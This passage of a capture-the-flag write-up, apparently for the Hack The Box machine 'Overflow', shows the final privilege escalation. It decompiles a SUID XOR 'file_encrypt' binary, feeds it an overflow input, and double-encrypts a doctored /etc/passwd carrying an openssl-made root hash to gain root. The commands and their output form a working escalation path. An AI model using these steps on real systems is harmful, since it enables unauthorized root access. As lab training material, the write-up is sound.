      <span class="mtk8">fprintf</span><span class="mtk1">((FILE</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk4">"cannot</span> <span class="mtk4">open</span> <span class="mtk4">output</span> <span class="mtk4">file</span> <span class="mtk6">%s</span><span class="mtk4">:</span> <span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk1">(</span><span class="mtk7 mtki">char</span> <span class="mtk5">*</span><span class="mtk1">)</span> <span class="mtk5">&amp;</span><span class="mtk1">local_98,</span> <span class="mtk1">pcVar3);</span>  
      <span class="mtk8">fclose</span><span class="mtk1">(local_10);</span>
    <span class="mtk1">}</span> <span class="mtk5">else</span> <span class="mtk1">{</span>
      <span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
        <span class="mtk1">local_18</span> <span class="mtk5">=</span> <span class="mtk8">_IO_getc</span><span class="mtk1">(local_10);</span>
        <span class="mtk5">if</span> <span class="mtk1">(local_18</span> <span class="mtk5">==</span> <span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
        <span class="mtk8">_IO_putc</span><span class="mtk1">(local_18</span> <span class="mtk5">^</span> <span class="mtk5">0x</span><span class="mtk6">9b</span><span class="mtk1">,</span> <span class="mtk1">local_14);</span>
      <span class="mtk1">}</span>
      <span class="mtk8">fclose</span><span class="mtk1">(local_10);</span>
      <span class="mtk8">fclose</span><span class="mtk1">(local_14);</span>
    <span class="mtk1">}</span>
  <span class="mtk1">}</span>
  <span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Basically, what it does is take a file, encrypt it and write the result into another file. Let&rsquo;s try it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:~$ cd /tmp
tester@overflow:/tmp$ mkdir .test
tester@overflow:/tmp$ cd .test
tester@overflow:/tmp/.test$ echo asdf > t
tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: /tmp/.test/t
Enter Encrypted File: /tmp/.test/t_enc
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 8
-rw-rw-r-- 1 tester tester 5  t
-rw-rw-r-- 1 root   tester 5  t_enc
tester@overflow:/tmp/.test$ xxd t
00000000: 6173 6466 0a                             asdf.
tester@overflow:/tmp/.test$ xxd t_enc
00000000: fae8 fffd 91                             .....
</code></pre></div><p>And the program wrote the file <code>t_enc</code>, which is owned by <code>root</code>.</p><p>In the decompiled source code, we discover that the encryption method is XOR byte-wise with a key of <code>0x9b</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">while</span> <span class="mtk1">(</span><span class="mtk6">true</span><span class="mtk1">)</span> <span class="mtk1">{</span>
  <span class="mtk1">local_18</span> <span class="mtk5">=</span> <span class="mtk8">_IO_getc</span><span class="mtk1">(local_10);</span>
  <span class="mtk5">if</span> <span class="mtk1">(local_18</span> <span class="mtk5">==</span> <span class="mtk5">0x</span><span class="mtk6">ffffffff</span><span class="mtk1">)</span> <span class="mtk5">break</span><span class="mtk1">;</span>
  <span class="mtk8">_IO_putc</span><span class="mtk1">(local_18</span> <span class="mtk5">^</span> <span class="mtk5">0x</span><span class="mtk6">9b</span><span class="mtk1">,</span> <span class="mtk1">local_14);</span>  
<span class="mtk1">}</span>
</code></pre></div><p>To decrypt the file, we just can XOR byte-wise with the same key <code>0x9b</code>. Namely, we take the hexdump of file <code>t_enc</code> and do the XOR operation with the key:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">&gt;&gt;&gt; hex(0xfae8fffd91 ^ 0x9b9b9b9b9b)  
'0x617364660a'
</code></pre></div><p>And we get <code>asdf</code> (in hexadecimal) that is the contents file called <code>t</code>.</p><p>There is a validation on the file we want to encrypt: it must not be owned by <code>root</code>. However, there is no validation on the output file, so we have write permissions as <code>root</code>.</p><p>Having write permissions as <code>root</code> allows us to add a public SSH key into <code>/root/.ssh/authorized_keys</code> or overwrite <code>/etc/passwd</code> to specify a certain password for <code>root</code> in DES Unix format. This time we will carry out the second approach.</p><p>Notice this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ cp t_enc t2
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 12
-rw-rw-r-- 1 tester tester 5  t
-rw-rw-r-- 1 tester tester 5  t2
-rw-rw-r-- 1 root   tester 5  t_enc
tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: /tmp/.test/t2
Enter Encrypted File: /tmp/.test/t2_enc
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 16
-rw-rw-r-- 1 tester tester 5  t
-rw-rw-r-- 1 tester tester 5  t2
-rw-rw-r-- 1 root   tester 5  t_enc
-rw-rw-r-- 1 root   tester 5  t2_enc
tester@overflow:/tmp/.test$ cat t2_enc
asdf
</code></pre></div><p>We have encrypted the already encrypted file (<code>t2</code> is a copy of <code>t_enc</code>, but belonging to <code>tester</code> and not <code>root</code>), and the output of the double-encrypted file is the same as the original file <code>t</code> (that was <code>asdf</code>). So that is the trick, we must write a file, encrypt it, copy it and encrypt it again. The output of the second encryption will be in plain text.</p><p>Let&rsquo;s modify a copy of <code>/etc/passwd</code> using <code>sed</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ which openssl
/usr/bin/openssl
tester@overflow:/tmp/.test$ openssl passwd 7rocky
OO3PvAT9Z8SvU
tester@overflow:/tmp/.test$ cp /etc/passwd p1
tester@overflow:/tmp/.test$ head -1 p1
root:x:0:0:root:/root:/bin/bash
tester@overflow:/tmp/.test$ sed -i 's/root:x/root:OO3PvAT9Z8SvU/' p1  
tester@overflow:/tmp/.test$ head -1 p1
root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash
</code></pre></div><p>We have changed the <code>x</code> for <code>OO3PvAT9Z8SvU</code>. This will provoke that <code>su root</code> compares the password inserted in DES Unix format with <code>OO3PvAT9Z8SvU</code>, and not with the hash inside <code>/etc/shadow</code>.</p><p>Let&rsquo;s encrypt <code>p1</code> for the first time:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: p1
Enter Encrypted File: p1_enc
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ ls -l --time-style=+
total 24
-rw-r--r-- 1 tester tester 1735  p1
-rw-rw-r-- 1 tester tester 1735  p1_enc
-rw-rw-r-- 1 tester tester    5  t
-rw-rw-r-- 1 tester tester    5  t2
-rw-rw-r-- 1 root   tester    5  t2_enc
-rw-rw-r-- 1 root   tester    5  t_enc
</code></pre></div><p>Now we create a copy of <code>p1_enc</code> as <code>p2</code> end encrypt it. The output will be written to <code>/etc/passwd</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ cp p1_enc p2
tester@overflow:/tmp/.test$ /opt/file_encrypt/file_encrypt
This is the code 1804289383. Enter the Pin: -202976456
name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[XUV
Thanks for checking. You can give your feedback for improvements at developer@overflow.htb  
Enter Input File: p2
Enter Encrypted File: /etc/passwd
Segmentation fault (core dumped)
tester@overflow:/tmp/.test$ head -1 /etc/passwd
root:OO3PvAT9Z8SvU:0:0:root:/root:/bin/bash
</code></pre></div><p>And we have successfully overwritten <code>/etc/passwd</code>. We are able to login as <code>root</code> with password <code>7rocky</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">tester@overflow:/tmp/.test$ su root
Password:
root@overflow:/tmp/.test# cat /root/root.txt  
b3ae2337f9ea07d8a4c9b8613ad860a0
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#getting-access-as-admin">Getting access as <code>admin</code></a></li><li><a href="#finding-a-sqli">Finding a SQLi</a></li><li><a href="#exploiting-sqli">Exploiting SQLi</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#lateral-movement-to-developer">Lateral movement to <code>developer</code></a></li><li><a href="#lateral-movement-to-tester">Lateral movement to <code>tester</code></a></li><li><a href="#analizing-a-suid-binary">Analizing a SUID binary</a></li><li><a href="#exploiting-a-buffer-overflow">Exploiting a Buffer Overflow</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>